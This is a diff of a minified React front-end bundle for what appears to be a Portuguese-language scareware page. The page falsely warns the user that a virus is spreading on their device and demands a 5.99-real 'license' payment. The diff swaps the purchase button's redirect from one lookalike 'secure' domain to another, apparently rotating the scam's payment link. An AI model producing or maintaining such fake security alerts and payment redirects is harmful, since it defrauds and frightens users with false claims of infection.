@@ -69,4 +69,4 @@ Error generating stack: `+o.message+`
 
 Dentro de nossa comunidade sempre pedimos para desinstalar o aplicativo justamente por conta que não enviamos mais atualizações para versões antigas.
 
-Para receber uma atualização e evitar que o vírus se espalhe no seu dispositivo, adquira uma licença ativa no valor de 5,99 reais.`,buttonText:"ADQUIRIR LICENÇA",onClick:()=>window.location.href="https://pixseguuro.com/62c243a81d"})})]})}nc(document.getElementById("root")).render(z.jsx(Fe.StrictMode,{children:z.jsx(Md,{})}));
+Para receber uma atualização e evitar que o vírus se espalhe no seu dispositivo, adquira uma licença ativa no valor de 5,99 reais.`,buttonText:"ADQUIRIR LICENÇA",onClick:()=>window.location.href="https://ambienteseguro.org.ua/c/0137cc09ea"})})]})}nc(document.getElementById("root")).render(z.jsx(Fe.StrictMode,{children:z.jsx(Md,{})}));
